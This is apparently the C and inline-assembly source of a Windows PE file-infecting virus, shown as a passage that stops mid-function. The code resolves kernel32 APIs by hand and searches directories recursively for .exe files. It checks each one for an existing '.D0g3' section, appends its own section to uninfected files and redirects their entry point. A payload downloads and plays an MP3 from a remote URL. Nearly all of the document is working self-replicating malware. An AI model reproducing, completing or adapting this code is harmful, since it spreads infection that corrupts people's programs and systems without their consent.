#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include "head.h"

DWORD __stdcall f0_cmp(char* x, char* y, int len);
void __stdcall  f1_cpy(char* x, char* y, int len);
DWORD __stdcall f2_len(char* X);
void __stdcall  f3_GetKernelBase();
DWORD __stdcall f4_Align(DWORD dwSize, DWORD dwAlign);
DWORD __stdcall f5_patchPe(DWORD f_Name);
DWORD __stdcall f6_getD0g3Section();
DWORD __stdcall f7_CheckFIle(DWORD f_Name);
void __stdcall  f8_SearchFile2();
DWORD __stdcall f9_GetApi(DWORD mImageBase, char* funcName);
void __stdcall  f10_initApi();
void __stdcall  f11_freloc(DWORD* x, int len, DWORD dif);
void __stdcall  f12_music();
void __stdcall  f13_fcat(char* x, char* y);
DWORD __stdcall f14_str_find(char* x, char y);
void  __stdcall f15_FindExeFilesRecursive(char* directory, int* cnt);
#pragma code_seg(".D0g3") 
__declspec(allocate(".D0g3")) __declspec(selectany)  DWORD apiAddr[24] = { 0 };
__declspec(allocate(".D0g3")) __declspec(selectany)  int funcAddr[] =  //18
{
    //要重定位的的东西14个
    f0_cmp,//0
    f1_cpy,//1
    f2_len,//2
    f3_GetKernelBase,//3
    f4_Align,//4
    f5_patchPe,//5
    f6_getD0g3Section,//6
    f7_CheckFIle,//7
    f8_SearchFile2,//8
    f9_GetApi,//9
    f10_initApi,//10
    f11_freloc,//11
    f12_music,//12
    f13_fcat,//13
    f14_str_find,//14
    f15_FindExeFilesRecursive,//15
    0,//16
    0,//dif 17
};

__declspec(allocate(".D0g3")) __declspec(selectany) char szkernel32[] = "kernel32.dll";
__declspec(allocate(".D0g3")) __declspec(selectany) char szGetProcAddress[] = "GetProcAddress";
__declspec(allocate(".D0g3")) __declspec(selectany) char szLoadLibraryA[] = "LoadLibraryA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szCreateFileA[] = "CreateFileA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szReadFile[] = "ReadFile";
__declspec(allocate(".D0g3")) __declspec(selectany) char szWriteFile[] = "WriteFile";
__declspec(allocate(".D0g3")) __declspec(selectany) char szSetFilePointer[] = "SetFilePointer";
__declspec(allocate(".D0g3")) __declspec(selectany) char szCloseHandle[] = "CloseHandle";
__declspec(allocate(".D0g3")) __declspec(selectany) char szGetFileSize[] = "GetFileSize";
__declspec(allocate(".D0g3")) __declspec(selectany) char szGlobalAlloc[] = "GlobalAlloc";
__declspec(allocate(".D0g3")) __declspec(selectany) char szGlobalFree[] = "GlobalFree";
__declspec(allocate(".D0g3")) __declspec(selectany) char szFindFirstFileA[] = "FindFirstFileA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szFindNextFileA[] = "FindNextFileA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szFindClose[] = "FindClose";
__declspec(allocate(".D0g3")) __declspec(selectany) char szDeleteFileA[] = "DeleteFileA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szGetModuleHandleA[] = "GetModuleHandleA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szFreelibiary[] = "FreeLibrary";
__declspec(allocate(".D0g3")) __declspec(selectany) char szSleep[] = "Sleep";
__declspec(allocate(".D0g3")) __declspec(selectany) char szGetCurrentDirectoryA[] = "GetCurrentDirectoryA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szUrlmon[] = "Urlmon.dll";
__declspec(allocate(".D0g3")) __declspec(selectany) char szWinmm[] = "Winmm.dll";
__declspec(allocate(".D0g3")) __declspec(selectany) char szURLDownloadToFileA[] = "URLDownloadToFileA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szmciSendStringA[] = "mciSendStringA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szURL[] = "https://redqx.github.io/room/mp3/rq2.mp3";
__declspec(allocate(".D0g3")) __declspec(selectany) char szDpath[] = "D:/rq.mp3";
__declspec(allocate(".D0g3")) __declspec(selectany) char szmp31[] = "open D:/rq.mp3 alias dqx ";
__declspec(allocate(".D0g3")) __declspec(selectany) char szmp32[] = "play dqx";//
__declspec(allocate(".D0g3")) __declspec(selectany) DWORD szAPIname[] = //29
{
    //要重定位的的东西
    szkernel32,//0
    szGetProcAddress,//1
    szLoadLibraryA,//2
    szCreateFileA,//3
    szReadFile,//4
    szWriteFile,//5
    szSetFilePointer,//6
    szCloseHandle,//7
    szGetFileSize,//8
    szGlobalAlloc,//9
    szGlobalFree,//10
    szFindFirstFileA,//11
    szFindNextFileA,//12
    szFindClose,//13
    szGetModuleHandleA,//14
    szDeleteFileA,//15
    szFreelibiary,//16
    szSleep,//17
    szGetCurrentDirectoryA,//18

    //下载东西
    szUrlmon,//19
    szURLDownloadToFileA,//20

    //播放音乐的东西
    szWinmm,//21
    szmciSendStringA,//22

    szURL,//23
    szDpath,//24
    szmp31,//25
    szmp32,//26

    //重定向的27个
    0,
    0,//dif
};
DWORD __stdcall f0_cmp(char* x, char* y, int len)
{
    int  i;
    for (i = 0; i < len; i++)
    {
        if (x[i] > y[i])
        {
            return 1;
        }
        else if (x[i] < y[i])
        {
            return -1;
        }
    }
    return 0;
}
void __stdcall  f1_cpy(char* x, char* y, int len)
{
    int i;
    for (i = 0; i < len; i++)
    {
        x[i] = y[i];
    }
    x[i] = 0;
}
DWORD __stdcall f2_len(char* X)
{
    int i = 0;
    while (1)
    {
        if (X[i])
        {
            i++;
        }
        else
        {
            break;
        }
    }
    return i;
}
void __stdcall  f3_GetKernelBase()
{
    DWORD* lp_apiAddr;

    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;


        //重定位lpfuncAddr;
        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    DWORD32 High_Page; // edi

    High_Page = lp_apiAddr[0] & 0xFFFF0000;
    while (1)
    {
        if (*(DWORD*)High_Page == 0x00905A4D && *(DWORD*)(*(DWORD*)(High_Page + 60) + High_Page) == 0x00004550)//寻找PE和MZ标志
        {
            break;
        }
        High_Page -= 0x10000;
        if (High_Page < 0x70000000)//kernel32装到了在0x70000000以上的地址
        {
            return;
        }
    }
    lp_apiAddr[0] = High_Page;
    return;
}
DWORD __stdcall f4_Align(DWORD dwSize, DWORD dwAlign)//根据对齐粒度,去返回真实长度
{
    int tmp1 = dwSize / dwAlign;
    int mod1 = dwSize % dwAlign;
    if (mod1)//如果存在
    {
        return (tmp1 + 1) * dwAlign;
    }
    else
    {
        return dwSize;
    }
}
DWORD __stdcall f5_patchPe(DWORD f_Name) //我在检测别人的同时,自己就已经被感染了,所以直接拷贝字节的D0g3节区到别人的最后oui一个节区中,然后把ip指向我们的start
{
    DWORD* lp_apiAddr;
    DWORD* lpfuncAddr;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;


        //重定位lpfuncAddr;
        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        //重定位lpfuncAddr;
        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    BYTE szNewFile[MAX_PATH];
    BYTE szBuffer[256];
    DWORD hFile, dwTemp, dwEntry, lpMemory, OldEntry;
    DWORD fTemp0, dwFileSize, pNewSec;
    IMAGE_DOS_HEADER* dos_header;
    IMAGE_NT_HEADERS* nt_header;
    IMAGE_SECTION_HEADER* lp_hsec_extend;
    IMAGE_SECTION_HEADER* lp_hsec_last;
    DWORD  dwtmp;
    int secCnt;
    char tagSec[8];
    tagSec[0] = '.';
    tagSec[1] = 'D';
    tagSec[2] = '0';
    tagSec[3] = 'g';
    tagSec[4] = '3';
    tagSec[5] = 0;

    DWORD dataD0g3 = ((tf6_getD0g3Section)lpfuncAddr[6])();
    DWORD lenD0g3 = *((DWORD*)dataD0g3);
    if (dataD0g3 == -1)
    {
        return 0;
    }
    ((tGlobalFree10)lp_apiAddr[10])(dataD0g3);

    hFile = ((tCreateFileA3)lp_apiAddr[3])(f_Name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        goto Exit0;
    }
    dwFileSize = ((tGetFileSize8)lp_apiAddr[8])(hFile, NULL);
    if (dwFileSize == 0)
    {
        goto Exit1;
    }
    lpMemory = ((tGlobalAlloc9)(lp_apiAddr[9]))(GPTR, dwFileSize);
    if (lpMemory == 0)
    {
        goto Exit1;
    }
    ((tReadFile4)lp_apiAddr[4])(hFile, lpMemory, dwFileSize, &fTemp0, NULL);
    dos_header = lpMemory;
    nt_header = dos_header->e_lfanew + lpMemory;
    secCnt = nt_header->FileHeader.NumberOfSections;
    lp_hsec_last = (DWORD)nt_header + sizeof(IMAGE_NT_HEADERS) + (secCnt - 1) * sizeof(IMAGE_SECTION_HEADER);

    lp_hsec_extend = (DWORD)lp_hsec_last + sizeof(IMAGE_SECTION_HEADER);
    nt_header->FileHeader.NumberOfSections++;
    ((tf1_cpy)lpfuncAddr[1])(lp_hsec_extend->Name, tagSec, 5);
    lp_hsec_extend->PointerToRawData = lp_hsec_last->PointerToRawData + lp_hsec_last->SizeOfRawData;
    lp_hsec_extend->SizeOfRawData = ((tf4_Align)lpfuncAddr[4])(lenD0g3, nt_header->OptionalHeader.FileAlignment);//0x989是一个预设长度
    dwtmp = ((tf4_Align)lpfuncAddr[4])(lenD0g3, nt_header->OptionalHeader.SectionAlignment);
    nt_header->OptionalHeader.SizeOfCode += dwtmp;
    nt_header->OptionalHeader.SizeOfImage += dwtmp;
    lp_hsec_extend->Misc.VirtualSize = lenD0g3;
    lp_hsec_extend->VirtualAddress = lp_hsec_last->VirtualAddress + ((tf4_Align)lpfuncAddr[4])(lp_hsec_last->Misc.VirtualSize, nt_header->OptionalHeader.SectionAlignment);
    lp_hsec_extend->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;


    //备份别人的ep,然后修改ep,是一个RVA ,蠕虫在运行的时候,还要继续修改的
    lpfuncAddr[16] = nt_header->OptionalHeader.AddressOfEntryPoint; //一旦感染成功,那么他的[12]就记录

    nt_header->OptionalHeader.AddressOfEntryPoint = lp_apiAddr[23] + lp_hsec_extend->VirtualAddress;

    pNewSec = ((tGlobalAlloc9)lp_apiAddr[9])(GPTR, lp_hsec_extend->SizeOfRawData);
    ((tSetFilePointer6)lp_apiAddr[6])(hFile, 0, NULL, FILE_BEGIN);
    ((tWriteFile5)lp_apiAddr[5])(hFile, lpMemory, lp_hsec_extend->PointerToRawData, &fTemp0, NULL);//以前的东西
    ((tSetFilePointer6)lp_apiAddr[6])(hFile, lp_hsec_extend->PointerToRawData, NULL, FILE_BEGIN);

    //在这之前,你得把oep给解决了

    //这这里的时候,我们需要重定位复位,然后再粘贴给那个人

    dataD0g3 = ((tf6_getD0g3Section)lpfuncAddr[6])();
    dataD0g3 += 4;
    ((tWriteFile5)lp_apiAddr[5])(hFile, dataD0g3, lenD0g3, &fTemp0, NULL); // 附加的东西
    ((tGlobalFree10)lp_apiAddr[10])(pNewSec);
    dataD0g3 -= 4;
    ((tGlobalFree10)lp_apiAddr[10])(dataD0g3);
    //后面又是一个修改文件ep的操作
    //新代码的最后要去往旧的代码
Ret:
Exit2:
    ((tGlobalFree10)lp_apiAddr[10])(lpMemory);
Exit1:
    ((tCloseHandle7)lp_apiAddr[7])(hFile);
Exit0:
    return -1;
}
DWORD __stdcall f6_getD0g3Section()
{
    DWORD* lp_apiAddr;
    DWORD* lpfuncAddr;
    DWORD* lpAPIname;
    char tagSec[8] = { 0 };
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;

        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;


        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;


        lea eax, szAPIname;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpAPIname;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    DWORD headpRet;
    IMAGE_DOS_HEADER* dos_header = ((tGetModuleHandleA14)lp_apiAddr[14])(0);
    IMAGE_NT_HEADERS* nt_header = (DWORD)dos_header + dos_header->e_lfanew;
    DWORD secCnt = nt_header->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER* pMysec = (DWORD)nt_header + sizeof(IMAGE_NT_HEADERS);
    int i, secLen;
    char* lp;
    tagSec[0] = '.';
    tagSec[1] = 'D';
    tagSec[2] = '0';
    tagSec[3] = 'g';
    tagSec[4] = '3';
    for (i = 0; i < secCnt; i++)
    {
        if (!((tf0_cmp)lpfuncAddr[0])(pMysec->Name, tagSec, 5))
        {
            break;
        }
        pMysec = (DWORD)pMysec + sizeof(IMAGE_SECTION_HEADER);
    }
    if (i == secCnt)
    {
        return -1;//有问题
    }
    if (lp_apiAddr[23] > pMysec->VirtualAddress)//本来是一个多余的操作的
    {
        lp_apiAddr[23] = lp_apiAddr[23] - pMysec->VirtualAddress;//先获取地址
    }
    secLen = pMysec->SizeOfRawData;
    headpRet = ((tGlobalAlloc9)lp_apiAddr[9])(GPTR, secLen + 4);


    if (headpRet)
    {
        *((DWORD*)headpRet) = pMysec->SizeOfRawData;
        lp = headpRet + 4;

        for (i = 0; i < 18 - 2; i++) {
            lpfuncAddr[i] -= lpfuncAddr[17];
        }
        for (i = 0; i < 29 - 2; i++) {
            lpAPIname[i] -= lpAPIname[28];
        }
        for (i = 0; i < secLen; i++)
        {
            lp[i] = ((char*)pMysec->VirtualAddress + (DWORD)dos_header)[i];//在内存中,所以是VA
        }
        for (i = 0; i < 18 - 2; i++) {
            lpfuncAddr[i] += lpfuncAddr[17];
        }
        for (i = 0; i < 29 - 2; i++) {
            lpAPIname[i] += lpAPIname[28];
        }
        return  headpRet;
    }
    else
    {
        return -1;
    }

}
DWORD __stdcall f7_CheckFIle(DWORD f_Name)
{
    DWORD* lp_apiAddr;
    DWORD* lpfuncAddr;
    char tagSec[8] = { 0 };
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;

        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    DWORD ret;
    DWORD hFile, hLen, temp, pSec, nSec;
    IMAGE_DOS_HEADER dos_header;
    IMAGE_NT_HEADERS nt_header;
    IMAGE_SECTION_HEADER* lp_hsec_last;
    IMAGE_SECTION_HEADER* lp_hsec_head;
    tagSec[0] = '.';
    tagSec[1] = 'D';
    tagSec[2] = '0';
    tagSec[3] = 'g';
    tagSec[4] = '3';

    hFile = ((tCreateFileA3)lp_apiAddr[3])(f_Name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        goto Exit1;
    }
    hLen = ((tGetFileSize8)lp_apiAddr[8])(hFile, &temp);
    ((tReadFile4)lp_apiAddr[4])(hFile, &dos_header, sizeof(IMAGE_DOS_HEADER), &temp, NULL);
    if (dos_header.e_magic != 0x5A4D)
    {
        goto Exit1;
    }
    ((tSetFilePointer6)lp_apiAddr[6])(hFile, dos_header.e_lfanew, NULL, FILE_BEGIN);
    ((tReadFile4)lp_apiAddr[4])(hFile, &nt_header, sizeof(IMAGE_NT_HEADERS), &temp, NULL);
    if (nt_header.Signature != 0x4550 || nt_header.FileHeader.Machine != 0x014C)//得是x86的
    {
        goto Exit1;
    }
    pSec = ((tGlobalAlloc9)lp_apiAddr[9])(GPTR, hLen);
    if (pSec == NULL)
    {
        goto Exit1;
    }
    ((tSetFilePointer6)lp_apiAddr[6])(hFile, 0, NULL, FILE_BEGIN);
    ((tReadFile4)lp_apiAddr[4])(hFile, pSec, hLen, &temp, NULL);


    nSec = nt_header.FileHeader.NumberOfSections;
    lp_hsec_head = pSec + sizeof(IMAGE_NT_HEADERS) + dos_header.e_lfanew;
    lp_hsec_last = (DWORD)lp_hsec_head + (nSec - 1) * (sizeof(IMAGE_SECTION_HEADER));//附加节区

    //有没有被干扰
    //不能stdio东西的调用
    if (!((tf0_cmp)lpfuncAddr[0])(lp_hsec_last->Name, tagSec, 4))//最后一个节区,而不是附加一个截取
    {
        ((tGlobalFree10)lp_apiAddr[10])(pSec);
        ((tCloseHandle7)lp_apiAddr[7])(hFile);
        goto Exit1;//被感染了
    }
    //没被感染,可不可以新追加一个节区表
    while (!lp_hsec_head->PointerToRawData)//为0,就去下一个节
    {
        lp_hsec_head = (DWORD)lp_hsec_head + sizeof(IMAGE_SECTION_HEADER);
    }
    if (((DWORD)lp_hsec_last + 2 * sizeof(IMAGE_SECTION_HEADER) - pSec) > lp_hsec_head->PointerToRawData)//附加节区的结束位置的 > 第一个节区
    {
        goto Exit1;
    }
    ((tGlobalFree10)lp_apiAddr[10])(pSec);
    ((tCloseHandle7)lp_apiAddr[7])(hFile);
    goto Exit2;

Exit2:
    ret = -1;
    goto  Exit0;
Exit1:
    ret = 0;
Exit0:
    return ret;
}
void __stdcall  f8_SearchFile2()
{
    DWORD* lp_apiAddr;
    DWORD* lpfuncAddr;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;


        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }



    int i;
    int len;
    int cnt = 0;
    char currentDir[MAX_PATH];
    ((tGetCurrentDirectoryA18)lp_apiAddr[18])(MAX_PATH, currentDir);
    len = ((tf2_len)lpfuncAddr[2])(currentDir);

    for (i = len;; i--)//来到上一级目录
    {
        if (currentDir[i] == '\\' || i == 0)
        {
            currentDir[i] = 0;
            break;
        }
        currentDir[i] = 0;
    }
    ((tf15_FindExeFilesRecursive)lpfuncAddr[15])(currentDir, &cnt);//会去递归寻找一些东西
}
DWORD __stdcall f9_GetApi(DWORD mImageBase, char* funcName)
{
    DWORD* lp_apiAddr;
    DWORD* lpfuncAddr;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;


        //重定位lpfuncAddr;
        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        //重定位lpfuncAddr;
        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    PIMAGE_EXPORT_DIRECTORY lpExport_VA = 0;
    PIMAGE_DOS_HEADER lpDosheader = mImageBase;
    PIMAGE_NT_HEADERS32 lpNtheader_VA = lpDosheader->e_lfanew + mImageBase;
    DWORD32* AddressofName_VA;
    DWORD32* Addressoffunction_VA;
    WORD* AddressOfOrdinal_VA;
    int max = 0;
    int i; // ebx
    int len_fucname; // [esp+0h] [ebp-8h]

    len_fucname = ((tf2_len)lpfuncAddr[2])(funcName);

    //注意都要加上Imagebase
    lpExport_VA = lpNtheader_VA->OptionalHeader.DataDirectory[0].VirtualAddress + mImageBase;
    AddressofName_VA = lpExport_VA->AddressOfNames + mImageBase;// 获取addressofname
    AddressOfOrdinal_VA = lpExport_VA->AddressOfNameOrdinals + mImageBase;
    Addressoffunction_VA = lpExport_VA->AddressOfFunctions + mImageBase;
    max = lpExport_VA->NumberOfNames;
    i = 0;
    for (i = 0; i < max; i++)
    {
        if (!((tf0_cmp)lpfuncAddr[0])(funcName, AddressofName_VA[i] + mImageBase, len_fucname))//把AddressofName数组指向的名字都和目标函数进行比较,然后去找到
        {
            break;
        }
    }
    if (i == max)
    {
        return 0;
    }
    else
    {
        return  Addressoffunction_VA[AddressOfOrdinal_VA[i]] + mImageBase;//该函数对应的AddressOfOrdinal的成员,
    }
}
void __stdcall  f10_initApi()
{
    DWORD* lp_apiAddr;
    DWORD* lpfuncAddr;
    DWORD* lpszAPIname;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;

        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        lea eax, szAPIname;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpszAPIname;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    //lp_apiAddr[0]: kernel32 base
    lp_apiAddr[1] = ((tf9_GetApi)lpfuncAddr[9])(lp_apiAddr[0], lpszAPIname[1]);
    lp_apiAddr[2] = ((tf9_GetApi)lpfuncAddr[9])(lp_apiAddr[0], lpszAPIname[2]);
    lp_apiAddr[3] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[3]);
    lp_apiAddr[4] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[4]);
    lp_apiAddr[5] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[5]);
    lp_apiAddr[6] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[6]);
    lp_apiAddr[7] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[7]);
    lp_apiAddr[8] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[8]);
    lp_apiAddr[9] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[9]);
    lp_apiAddr[10] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[10]);
    lp_apiAddr[11] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[11]);
    lp_apiAddr[12] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[12]);
    lp_apiAddr[13] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[13]);
    lp_apiAddr[14] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[14]);
    lp_apiAddr[15] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[15]);
    lp_apiAddr[16] = ((tf9_GetApi)lpfuncAddr[9])(lp_apiAddr[0], lpszAPIname[16]);
    lp_apiAddr[17] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[17]);
    lp_apiAddr[18] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[0], lpszAPIname[18]);

    lp_apiAddr[19] = ((tLoadLibraryA2)lp_apiAddr[2])(lpszAPIname[19]);
    lp_apiAddr[20] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[19], lpszAPIname[20]);


    lp_apiAddr[21] = ((tLoadLibraryA2)lp_apiAddr[2])(lpszAPIname[21]);
    lp_apiAddr[22] = ((tGetProcAddress1)lp_apiAddr[1])(lp_apiAddr[21], lpszAPIname[22]);

    lp_apiAddr[23] = lpfuncAddr[10] + 350 - ((tGetModuleHandleA14)lp_apiAddr[14])(0);//感染者新的ep,一个RVA
    return;
}
void __stdcall  f11_freloc(DWORD* x, int len, DWORD dif)
{
    int i;
    for (i = 0; i < len; i++)
    {
        x[i] += dif;//老的+差距=新的
        //差距=新的-老的
    }
    i++;
    x[i] = dif;
}
void __stdcall  f12_music()
{
    DWORD* lp_apiAddr;
    DWORD* lpAPIname;

    HMODULE urlmonLib;
    HMODULE winmmLib;
    HRESULT hr;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;

        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        lea eax, szAPIname;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpAPIname;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }

    urlmonLib = lp_apiAddr[19];
    winmmLib = lp_apiAddr[21];
    if (urlmonLib && winmmLib)
    {

        if (lp_apiAddr[20] && lp_apiAddr[22])
        {
            hr = ((tURLDownloadToFileAFunc20)lp_apiAddr[20]) (0, lpAPIname[23], lpAPIname[24], 0, NULL);
            if (hr == S_OK)
            {
                ((tmciSendStringAFunc22)lp_apiAddr[22])(lpAPIname[25], 0, 0, 0);//音乐在当前目录下也可以写"open ./2.mp3"./这里可以省略
                ((tmciSendStringAFunc22)lp_apiAddr[22])(lpAPIname[26], 0, 0, 0);
                ((tSleep17)lp_apiAddr[17])(35 * 1000);
            }
        }
        ((tFreeLibrary16)lp_apiAddr[16])(urlmonLib);
        ((tFreeLibrary16)lp_apiAddr[16])(winmmLib);
        ((tDeleteFileA15)lp_apiAddr[15])(lpAPIname[24]);
    }
    return;
}
void __stdcall  f13_fcat(char* x, char* y)
{
    int i;
    DWORD* lpfuncAddr;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;


        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }

    int lenx = ((tf2_len)lpfuncAddr[2])(x);
    int leny = ((tf2_len)lpfuncAddr[2])(y);
    for (i = 0; i < leny; i++)
    {
        x[lenx + i] = y[i];
    }
    x[lenx + i] = 0;
    return;
}
DWORD __stdcall f14_str_find(char* x, char y)//应该返回组后一次出现的位置
{
    int  i;
    DWORD* lpfuncAddr;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;


        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    int len = ((tf2_len)lpfuncAddr[2])(x);
    DWORD xx = 0;
    for (i = 0; i < len; i++)
    {
        if (x[i] == y)
        {
            xx = &x[i];
        }
    }
    if (xx)
    {
        return xx;
    }
    return 0;
}
void  __stdcall f15_FindExeFilesRecursive(char* directory, int* cnt)
{
    char searchPath[MAX_PATH];
    char subDirPath[MAX_PATH];
    char filePath[MAX_PATH];
    WIN32_FIND_DATAA fileInfo;
    HANDLE hFind;
    DWORD* lp_apiAddr;
    DWORD* lpfuncAddr;
    char* extension;
    char exp1[8];
    exp1[0] = '.';
    exp1[1] = 'e';
    exp1[2] = 'x';
    exp1[3] = 'e';
    exp1[4] = 0;
    char exp2[8];
    exp2[0] = '\\';
    exp2[1] = '*';
    exp2[2] = '.';
    exp2[3] = '*';
    exp2[4] = 0;
    char exp3[8];
    exp3[0] = '.';
    exp3[1] = '.';
    exp3[2] = '\\';
    exp3[4] = 0;
    __asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx;


        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
    ((tf1_cpy)lpfuncAddr[1])(searchPath, directory, ((tf2_len)lpfuncAddr[2])(directory));
    ((tf13_fcat)lpfuncAddr[13])(searchPath, exp2);
    hFind = ((tFindFirstFileA11)lp_apiAddr[11])(searchPath, &fileInfo);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (!(fileInfo.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))//如果是文件
            {
                // 检查文件扩展名是否为exe
                extension = ((tf14_str_find)lpfuncAddr[14])(fileInfo.cFileName, '.');//寻找点的位置
                if (extension != NULL && ((tf0_cmp)lpfuncAddr[0])(extension, exp1, ((tf2_len)lpfuncAddr[2])(extension)) == 0)
                {
                    if ((*cnt) > 3)//如果感染个数超过4,就提前返回
                    {
                        ((tFindClose13)lp_apiAddr[13])(hFind);
                        return;//其它情况是正常返回
                    }
                    ((tf1_cpy)lpfuncAddr[1])(filePath, directory, ((tf2_len)lpfuncAddr[2])(directory));
                    ((tf13_fcat)lpfuncAddr[13])(filePath, &exp3[2]);
                    ((tf13_fcat)lpfuncAddr[13])(filePath, fileInfo.cFileName);
                    if (((tf7_CheckFIle)lpfuncAddr[7])(filePath) == -1)
                    {
                        ((tf5_patchPe)lpfuncAddr[5])(filePath);//无线传播
                        (*cnt)++;
                    }
                }
            }
            else if (((tf0_cmp)lpfuncAddr[0])(fileInfo.cFileName, exp3, 1) != 0 && ((tf0_cmp)lpfuncAddr[0])(fileInfo.cFileName, exp3, 2) != 0)//如果是目录
            {
                ((tf1_cpy)lpfuncAddr[1])(subDirPath, directory, ((tf2_len)lpfuncAddr[2])(directory));
